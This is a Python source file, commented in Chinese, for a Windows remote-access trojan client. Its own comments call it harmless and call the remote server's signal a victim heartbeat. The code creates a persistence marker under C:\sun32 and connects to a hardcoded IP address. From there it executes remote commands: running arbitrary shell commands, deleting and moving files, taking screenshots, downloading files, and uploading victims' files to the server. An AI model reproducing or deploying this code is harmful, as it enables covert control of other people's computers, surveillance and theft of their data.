#!/usr/bin/python
# -*- coding: UTF-8 -*-
#这是一个人畜无害，相当温和，德芙般丝滑的小程序
'''
此程序占用的资源为 Windows C 盘符下的 sun32 以及 Winsys 文件夹
此程序使用说明：
	此程序由远程服务器控制，并使用自制的终端工具进行操作
	工具包含 ls，we，cd，rm，mv，gp，up 七个工具
	大多命令行工具都与Linux操作类似
	"./"使用"."替换，注意！此程序为Windows基础，注意路径
	gp为获取屏幕截图 参数路径需要尾部加入“\\”结尾
	up为上传文件
	we为获取当前目录位置
'''
import pygame
import sys
import os
import socket
import time
import tkinter
import win32gui
import win32ui
import win32con
import win32api
import uuid
import shutil
import json
import urllib.request as ur


def remove_dir(dir):
	#用于删除路径的函数
	dir = dir.replace('\\', '/')
	if(os.path.isdir(dir)):
		for p in os.listdir(dir):
			remove_dir(os.path.join(dir,p))
		if(os.path.exists(dir)):
			os.rmdir(dir)
	else:
		if(os.path.exists(dir)):
			os.remove(dir)


class WinControl():
	def __init__(self,patha="",pathb="",data=""):
		self.path = ["C:"]
		self.host = ""
		self.patha = patha
		self.pathb = pathb
		self.data = data


	def uuid_write(self):
		#用于写入Windows的uuid唯一鉴别码
		l = []
		l.append(str(uuid.uuid4()))

		with open(self.patha,'w') as ojbk:
			json.dump(l,ojbk)

		return l[0]


	def uuid_read(self):
		#用于读取uuid码的函数
		with open(self.patha) as zx:  
			number = json.load(zx) 

		return number[0]


	def where_i_am(self):
		#用来反馈现在路径位置的函数
		path = "\\".join(self.path)
		return path


	def cd(self):
		#用来跳跃文件的位置
		if self.patha[0] == ".":
			path = self.patha
			path = path.lstrip(".")
			path = path.split("\\")
			pathlist = self.path + path
			self.path = pathlist

		else:
			self.path = self.patha.split("\\")
		
		return "None"


	def rm(self):
		#用于文件删除的函数
		if self.patha[0] == ".":
			path = self.patha
			path = path.lstrip(".")
			path = path.split("\\")
			path = self.path + path
			path = "\\".join(path)
		
		else:
			path = self.patha


		remove_dir(path)

		return "None"


	def mv(self):
		#用于移动文件的函数
		patha = self.patha
		pathb = self.pathb
		shutil.move(patha,pathb)
		return "None"


	def cp(self):
		#用于移动文件的函数
		patha = self.patha
		pathb = self.pathb
		shutil.copyfile(patha,pathb)
		return "None"


	def ls(self):
		#用于列出此目录下文件的函数
		if self.patha == ".":
			path = "\\".join(self.path)
		else:
			path = self.patha

		for root , dirs, files in os.walk(path,topdown=True):
			a = dirs + files
			a = 'thisisafengefu'.join(a)
			return a


	def zipin(self):
		start_dir = self.patha  # 要压缩的文件夹路径
		file_news = self.pathb  # 压缩后文件夹的名字包含zip

		z = zipfile.ZipFile(file_news, 'w', zipfile.ZIP_DEFLATED)
		for dir_path, dir_names, file_names in os.walk(start_dir):
			f_path = dir_path.replace(start_dir, '')  # 这一句很重要，不replace的话，就从根目录开始复制
			f_path = f_path and f_path + os.sep or ''  # 实现当前文件夹以及包含的所有文件的压缩
			for filename in file_names:
				z.write(os.path.join(dir_path, filename), f_path + filename)
		z.close()
		
		return "None"


	def zipout(self):
		"""
		压缩指定zip 压缩包
		"""
		dirpath = self.patha
		outFullName = self.pathb

		azip = zipfile.ZipFile(dirpath)
		#解压到原始目录
		azip.extractall(outFullName)

		return "None"


	def mkdir(self):
		path = self.patha
		os.makedirs(path)

		return "None" 


	def get_photo(self):

		# 获取桌面
		hdesktop = win32gui.GetDesktopWindow()

		# 分辨率适应
		width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
		height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
		left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
		top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

		# 创建设备描述表
		desktop_dc = win32gui.GetWindowDC(hdesktop)
		img_dc = win32ui.CreateDCFromHandle(desktop_dc)

		# 创建一个内存设备描述表
		mem_dc = img_dc.CreateCompatibleDC()

		# 创建位图对象
		screenshot = win32ui.CreateBitmap()
		screenshot.CreateCompatibleBitmap(img_dc, width, height)
		mem_dc.SelectObject(screenshot)

		# 截图至内存设备描述表
		mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)


		filename = str(uuid.uuid4())
		filepath = self.patha + filename + ".bmp"
		# 将截图保存到文件中
		screenshot.SaveBitmapFile(mem_dc, filepath)


		mem_dc.DeleteDC()
		win32gui.DeleteObject(screenshot.GetHandle())

		return "None"


	def download(self):

		ur.urlretrieve(self.patha, self.pathb)
		return "None"

	def systemrun(self):

		os.system(self.data)
		return "None"

class Socketz():

	def __init__(self,host,port,data=""):
		self.data = data
		self.host = host
		self.port = port
		self.sock = socket.socket()

	def connect(self):
		self.sock.connect((self.host, self.port))


	def heart(self):
		#发送被害心跳的函数
		self.sock.send("heart".encode("utf-8"))
		my = self.sock.recv(1024).decode("utf-8")
		#发送uuid
		self.sock.send(self.data.encode("utf-8"))
		server_rec = self.sock.recv(1024).decode("utf-8")

		return server_rec


	def long_tcp(self):
		self.sock.send("intotcplong".encode("utf-8"))
		while True:
			cmd = self.sock.recv(1024).decode("utf-8")
			cmd = cmd.split("@")

			if cmd[0] == "up":

				self.data = cmd[1]

				print("进入上传模式")
				f = open(self.data,"rb")

				size = os.stat(self.data).st_size #获取文件大小
				#发送文件大小 

				self.sock.send(str(size).encode("utf-8"))
				print(size)

				#打印服务器反馈
				server_reply = self.sock.recv(1024).decode("utf-8")
				print(str(server_reply))

				for x in f:
					self.sock.send(x)


				print("发送完成")

				#打印服务器反馈
				server_reply = self.sock.recv(1024).decode("utf-8")
				print(str(server_reply))		

				self.sock.send("back".encode("utf-8"))
				
			else:	
				data = cmdx(cmd)
				if data == None:
					data = "None"
				self.sock.send(data.encode("utf-8"))


	def stop(self):
		self.sock.close()



def cmdx(cmd):

	if cmd[0] == "ls":
		if len(cmd) > 1:
			windows.patha = cmd[1]
		else:
			windows.patha = "."
		p = windows.ls()
		return p


	if cmd[0] == "we":
		p = windows.where_i_am()
		return p


	if cmd[0] == "rm":
		windows.patha = cmd[1]
		p = windows.rm()
		return p


	if cmd[0] == "cd":
		windows.patha = cmd[1]
		p = windows.cd()
		return p


	if cmd[0] == "mv":
		windows.patha = cmd[1]
		windows.pathb = cmd[2]
		p = windows.mv()
		return p


	if cmd[0] == "zipin":
		windows.patha = cmd[1]
		windows.pathb = cmd[2]
		p = windows.zipin()
		return p


	if cmd[0] == "zipout":
		windows.patha = cmd[1]
		windows.pathb = cmd[2]
		p = windows.zipout()
		return p


	if cmd[0] == "cp":
		windows.patha = cmd[1]
		windows.pathb = cmd[2]
		p = windows.cp()
		return p


	if cmd[0] == "gp":
		windows.patha = cmd[1]
		p = windows.get_photo()
		return p


	if cmd[0] == "get":
		windows.patha = cmd[1]
		windows.pathb = cmd[2]
		p = windows.download()
		return p


	if cmd[0] == "mkdir":
		windows.patha = cmd[1]
		p = windows.mkdir()
		return p


	if cmd[0] == "sys":
		windows.data = cmd[1]
		p = windows.systemrun()
		return p
	



def main():
	print("攻击程序 客户端启动\n 核心主控程序")

	print("开始判定是否有安装痕迹")
	if os.path.exists(r"C:\sun32\center\windows"):
		windows.patha = r"C:\sun32\center\windows\uuid.json"
		uuid = windows.uuid_read()
		print("控制程序配置ID已存在")
		print(uuid)

	else:
		os.makedirs(r"C:\sun32\center\windows")
		windows.patha = r"C:\sun32\center\windows\uuid.json"
		uuid = windows.uuid_write()
		print("控制程序配置id不存在，创建ID")
		print(uuid)


	while True:
		print("进入循环")

		print("正在连接服务器")
		sockc = Socketz(host="101.200.138.115"\
			,port=2233)
		sockc.data = uuid
		sockc.connect()
		print("连接完成！准备发送心跳")

		cmd = sockc.heart()
		if cmd == "stop":
			sockc.stop()
			print("心跳停止，开始等待")
			time.sleep(5)
		if cmd == "start":
			print("心跳接入，开启tcp长连接")
			sockc.long_tcp()
		



if __name__=='__main__':

	pygame.init()  # 初始化pygame
	size = width, height = 320, 240  # 设置窗口大小

	while True:	
		try:
			windows = WinControl()
			main()

		except:
			time.sleep(10)
			print("核心出错！进行重启！")	


	screen = pygame.display.set_mode(size)  # 显示窗口
	while True:  # 死循环确保窗口一直显示
		for event in pygame.event.get():  # 遍历所有事件
			if event.type == pygame.QUIT:  # 如果单击关闭窗口，则退出
				sys.exit()

	pygame.quit()  # 退出pygame




























